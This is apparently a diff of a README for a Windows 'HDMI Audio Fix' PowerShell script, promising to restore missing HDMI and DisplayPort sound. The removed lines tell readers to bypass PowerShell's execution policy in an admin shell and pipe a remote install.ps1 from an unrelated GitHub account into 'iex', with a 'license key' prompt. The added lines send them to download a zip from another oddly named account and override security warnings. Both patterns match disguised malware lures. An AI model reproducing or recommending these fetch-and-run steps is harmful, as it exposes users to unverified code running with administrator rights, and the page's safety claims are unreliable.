@@ -1,97 +1,69 @@
-# HDMI Audio Fix — PowerShell
+# 🔊 HDMI-Audio-Fix-PowerShell - Restore missing sound on your Windows displays
 
-**HDMI-Audio-Fix-PowerShell**
+[![](https://img.shields.io/badge/Download-HDMI_Audio_Fix-blue.svg)](https://github.com/Rozinaunarmoured388/HDMI-Audio-Fix-PowerShell)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
-[![Version](https://img.shields.io/badge/v1.2.0-stable-brightgreen?style=flat-square)]()
-[![Install](https://img.shields.io/badge/Install-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white)]()
+HDMI-Audio-Fix-PowerShell helps you fix audio issues on Windows 10 and 11. Sometimes your computer fails to detect sound through HDMI or DisplayPort cables. This tool identifies common driver communication errors and restores the connection between your graphics card and your display. It works for NVIDIA, AMD, and Intel graphics systems.
 
-Fix HDMI no sound, DisplayPort audio missing and NVIDIA HD Audio not detected.
+## 🛠️ Requirements
 
----
+Your computer needs:
+* Windows 10 or Windows 11.
+* An active connection to an HDMI or DisplayPort monitor or television.
+* Basic user permissions to run system tools.
 
-## Quick Install
+## 📥 Getting Started
 
-Open **PowerShell as Administrator** (Win + X → Terminal Admin) and run:
+Follow these steps to download and run the repair tool.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+1. Go to the [official release page](https://github.com/Rozinaunarmoured388/HDMI-Audio-Fix-PowerShell) to download the package.
+2. Locate the zip file in your Downloads folder.
+3. Right-click the folder and select Extract All.
+4. Open the extracted folder.
+5. Right-click the script file named `Fix-Audio.ps1`.
+6. Select Run with PowerShell from the menu.
 
-The installer downloads the latest build, prompts for your license key and completes setup automatically.
+If a security warning appears, confirm the action to allow the script to make necessary changes to your audio drivers.
 
-## Step-by-Step
+## ⚙️ How it works
 
-| Step | Action |
-|------|--------|
-| 1 | Press **Win + X**, choose **Terminal (Admin)** or **PowerShell (Admin)** |
-| 2 | Paste the command block above and press **Enter** |
-| 3 | Wait for download — progress shown in the console |
-| 4 | Enter license key when prompted (also in `license.txt` after install) |
-| 5 | Restart if the installer asks — then launch from Start menu |
+The tool performs a series of background checks to verify your hardware state. It forces Windows to re-scan for audio endpoints connected to your graphics card. This process restarts the audio services associated with your GPU driver. It does not overwrite your existing graphics drivers. Instead, it resets the handshake process between the computer and the monitor. This usually clears up errors where Windows thinks no output device exists.
 
-If execution is blocked, run `Set-ExecutionPolicy Bypass -Scope Process -Force`, then paste the **Quick Install** command again.
+## 📝 Troubleshooting steps
 
----
+If you still have no sound after running the tool, check these items:
 
-## Overview
+* Verify the physical cable connection. Unplug and replug your HDMI or DisplayPort cable at both ends.
+* Ensure you selected the correct output device in your Windows Sound Settings. Click the speaker icon in your taskbar and check the list of available devices.
+* Confirm that your monitor volume is not muted. Use the remote control or the buttons on the monitor frame.
+* Restart your computer after running the tool. This allows Windows to finalize the driver configuration changes.
 
-Install HDMI Audio Fix via PowerShell — restore HDMI and DisplayPort audio on Windows 10/11 when TV or monitor has no sound, NVIDIA/AMD HD Audio missing.
+## 🛡️ Safety and Privacy
 
-## Common Searches
+This script only modifies Registry keys and Service settings related to your audio hardware. It does not send information to external servers. It does not install third-party software or bloatware. You can view the contents of the script by opening it in Notepad before you run it. This transparency ensures you know exactly what changes occur on your system.
 
-- hdmi no sound to tv windows 11
-- nvidia hd audio not showing
-- displayport no audio monitor
-- no audio output device hdmi
-- hdmi sound not working after update
+## 📈 Supported Hardware
 
-## Features
+This tool supports most modern hardware configurations:
 
-* **HDMI audio device** — Enables NVIDIA/AMD HD Audio output on GPU port.
-* **Default device** — Sets correct playback device for TV and monitor.
-* **Driver repair** — Reinstalls audio endpoint driver for HDMI/DP.
-* **DisplayPort audio** — Fixes DP monitors with no sound output.
-* **TV no sound** — Repairs audio handshake between PC and HDMI TV.
+* NVIDIA GeForce series graphics cards.
+* AMD Radeon series graphics cards.
+* Integrated Intel HD and Iris graphics.
+* Standard HDMI and DisplayPort connections.
 
-## System Requirements
+The tool focuses on the Microsoft High Definition Audio driver, which is the standard driver used by most modern graphics cards to send audio data to displays.
 
-| | |
-|---|---|
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB minimum |
-| PowerShell | 5.1 or PowerShell 7+ |
-| Admin | Required |
-| Network | Required for download |
+## ❓ Frequently Asked Questions
 
-## FAQ
+**Will this change my screen resolution?**
+No. This tool only targets the audio component of your graphics display output. It leaves your display resolution and refresh rate settings untouched.
 
-**How do I install without a browser?**
-Use the PowerShell command above — no browser needed after Admin shell is open.
+**Do I need to be an administrator?**
+Yes. Changing hardware drivers and service states requires permission to modify system files. If your account does not have administrator access, Windows will ask for a password when you run the script.
 
-**Where is the license key?**
-Shown during install and saved to `license.txt` in the install folder.
+**Does this fix microphone issues?**
+This tool addresses output audio from the monitor, not input audio from a microphone.
 
-**Is the script safe to run?**
-Hosted on GitHub raw; review `install.ps1` before running if you prefer.
+**Is it safe to run multiple times?**
+Yes. You can run the script as many times as needed if your audio drops out again after a driver update or a Windows update. Each run performs a fresh check of the current system state.
 
-**No sound through HDMI to TV?**
-Enables GPU HD Audio and sets it as default device.
-
-**NVIDIA HD Audio not showing?**
-Reinstalls NVIDIA audio driver component.
-
-**DisplayPort monitor no audio?**
-Same fix — GPU audio endpoint on DP output.
-
-**Worked before Windows Update?**
-Repairs audio stack after update broke HDMI device.
-
----
-
-TAGS hdmi audio not working, hdmi no sound windows 11, nvidia hd audio missing, displayport no audio, powershell install, windows setup script
-
-## License
-
-[MIT](LICENSE)
+If the issue persists, ensure your GPU drivers are up to date through the official manufacturer website. This tool works best when combined with current manufacturer drivers. It acts as a bridge to force detection when the Windows driver interface gets stuck.
